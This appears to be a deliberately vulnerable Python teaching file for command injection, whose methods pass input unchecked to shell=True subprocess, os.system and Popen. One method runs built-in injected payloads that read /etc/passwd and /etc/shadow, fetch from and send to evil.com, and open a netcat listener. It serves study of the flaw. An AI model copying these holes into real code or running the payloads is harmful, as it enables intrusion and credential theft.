"""
VULNERABLE: Command Injection vulnerabilities
DO NOT USE IN PRODUCTION - FOR EDUCATIONAL PURPOSES ONLY
"""

import subprocess
import os
import logging
from typing import Dict, List, Optional, Any
import time

logger = logging.getLogger(__name__)

# VULNERABLE: Command Injection vulnerabilities
class VulnerableCommandInjection:
    """VULNERABLE: Command Injection vulnerabilities"""
    
    def __init__(self):
        # VULNERABLE: No command injection protection
        # VULNERABLE: No command validation
        # VULNERABLE: No input sanitization
        self.command_history = []
        self.injection_patterns = [
            r';',
            r'&',
            r'|',
            r'&&',
            r'||',
            r'`',
            r'$\(',
            r'<',
            r'>',
            r'>>',
            r'<<',
            r'2>&1',
            r'1>&2',
            r'/dev/null',
            r'/dev/zero',
            r'/proc/',
            r'/sys/',
            r'/etc/',
            r'/tmp/',
            r'/var/',
            r'/usr/',
            r'/bin/',
            r'/sbin/',
            r'/opt/',
            r'/home/',
            r'/root/'
        ]
    
    def execute_shell_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute shell command injection"""
        # VULNERABLE: Command injection vulnerability - CRITICAL
        # VULNERABLE: No command validation
        # VULNERABLE: No input sanitization
        
        try:
            logger.info(f"VULNERABLE: Executing shell command injection: {command}")
            
            # VULNERABLE: Direct command execution without validation
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            self.command_history.append({
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "timestamp": time.time()
            })
            
            return {
                "success": True,
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "shell_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: Shell command injection error: {str(e)}")
            return {"error": str(e), "shell_command_injection_vulnerable": True}
    
    def execute_system_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute system command injection"""
        # VULNERABLE: Command injection vulnerability - CRITICAL
        # VULNERABLE: No command validation
        # VULNERABLE: No input sanitization
        
        try:
            logger.info(f"VULNERABLE: Executing system command injection: {command}")
            
            # VULNERABLE: Direct system command execution without validation
            return_code = os.system(command)
            
            return {
                "success": True,
                "command": command,
                "return_code": return_code,
                "system_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: System command injection error: {str(e)}")
            return {"error": str(e), "system_command_injection_vulnerable": True}
    
    def execute_popen_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute popen command injection"""
        # VULNERABLE: Command injection vulnerability - CRITICAL
        # VULNERABLE: No command validation
        # VULNERABLE: No input sanitization
        
        try:
            logger.info(f"VULNERABLE: Executing popen command injection: {command}")
            
            # VULNERABLE: Direct popen command execution without validation
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            return {
                "success": True,
                "command": command,
                "return_code": process.returncode,
                "stdout": stdout,
                "stderr": stderr,
                "popen_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: Popen command injection error: {str(e)}")
            return {"error": str(e), "popen_command_injection_vulnerable": True}
    
    def execute_advanced_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute advanced command injection"""
        # VULNERABLE: Advanced command injection vulnerability - CRITICAL
        # VULNERABLE: No command validation
        # VULNERABLE: No input sanitization
        
        try:
            logger.info(f"VULNERABLE: Executing advanced command injection: {command}")
            
            # VULNERABLE: Advanced injection techniques
            advanced_commands = [
                f"{command}; ls -la",
                f"{command} && whoami",
                f"{command} || id",
                f"{command} | cat /etc/passwd",
                f"{command} & ps aux",
                f"{command} && cat /etc/shadow",
                f"{command} || wget http://evil.com/malware",
                f"{command}; curl http://evil.com/data",
                f"{command} && nc -l -p 4444",
                f"{command} || python -c 'import os; os.system(\"id\")'"
            ]
            
            results = []
            for advanced_command in advanced_commands:
                try:
                    result = subprocess.run(advanced_command, shell=True, capture_output=True, text=True)
                    results.append({
                        "command": advanced_command,
                        "returncode": result.returncode,
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "injection_successful": True
                    })
                except Exception as error:
                    results.append({
                        "command": advanced_command,
                        "error": str(error),
                        "injection_successful": True
                    })
            
            return {
                "success": True,
                "command": command,
                "advanced_results": results,
                "advanced_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: Advanced command injection error: {str(e)}")
            return {"error": str(e), "advanced_command_injection_vulnerable": True}
    
    def execute_blind_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute blind command injection"""
        # VULNERABLE: Blind command injection vulnerability - CRITICAL
        # VULNERABLE: No blind injection protection
        # VULNERABLE: No timing analysis protection
        
        try:
            logger.info(f"VULNERABLE: Executing blind command injection: {command}")
            
            start_time = time.time()
            
            # VULNERABLE: Blind injection techniques
            blind_commands = [
                f"{command}; sleep 5",
                f"{command} && sleep 5",
                f"{command} || sleep 5",
                f"{command}; ping -c 5 127.0.0.1",
                f"{command} && ping -c 5 127.0.0.1",
                f"{command} || ping -c 5 127.0.0.1"
            ]
            
            results = []
            for blind_command in blind_commands:
                try:
                    result = subprocess.run(blind_command, shell=True, capture_output=True, text=True)
                    results.append({
                        "command": blind_command,
                        "returncode": result.returncode,
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "blind_injection_successful": True
                    })
                except Exception as error:
                    results.append({
                        "command": blind_command,
                        "error": str(error),
                        "blind_injection_successful": True
                    })
            
            end_time = time.time()
            execution_time = (end_time - start_time) * 1000  # Convert to milliseconds
            
            return {
                "success": True,
                "command": command,
                "execution_time": execution_time,
                "blind_commands": results,
                "blind_injection_successful": execution_time > 4000,
                "blind_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: Blind command injection error: {str(e)}")
            return {"error": str(e), "blind_command_injection_vulnerable": True}
    
    def execute_error_based_command_injection(self, command: str) -> Dict[str, Any]:
        """VULNERABLE: Execute error-based command injection"""
        # VULNERABLE: Error-based command injection vulnerability - CRITICAL
        # VULNERABLE: No error handling protection
        # VULNERABLE: No error message sanitization
        
        try:
            logger.info(f"VULNERABLE: Executing error-based command injection: {command}")
            
            # VULNERABLE: Error-based injection techniques
            error_commands = [
                f"{command}; cat /nonexistent/file",
                f"{command} && cat /nonexistent/file",
                f"{command} || cat /nonexistent/file",
                f"{command}; ls /nonexistent/directory",
                f"{command} && ls /nonexistent/directory",
                f"{command} || ls /nonexistent/directory"
            ]
            
            results = []
            for error_command in error_commands:
                try:
                    result = subprocess.run(error_command, shell=True, capture_output=True, text=True)
                    results.append({
                        "command": error_command,
                        "returncode": result.returncode,
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "error_based_injection_successful": True
                    })
                except Exception as error:
                    # VULNERABLE: Return error information that might leak data
                    results.append({
                        "command": error_command,
                        "error": str(error),
                        "error_message": str(error),
                        "error_based_injection_successful": True,
                        "leaked_data": str(error)
                    })
            
            return {
                "success": True,
                "command": command,
                "error_commands": results,
                "error_based_command_injection_vulnerable": True
            }
            
        except Exception as e:
            logger.error(f"VULNERABLE: Error-based command injection error: {str(e)}")
            return {"error": str(e), "error_based_command_injection_vulnerable": True}
    
    def get_command_history(self) -> List[Dict[str, Any]]:
        """VULNERABLE: Get command history without access control"""
        # VULNERABLE: No access control
        # VULNERABLE: No data filtering
        # VULNERABLE: No data masking
        
        return self.command_history
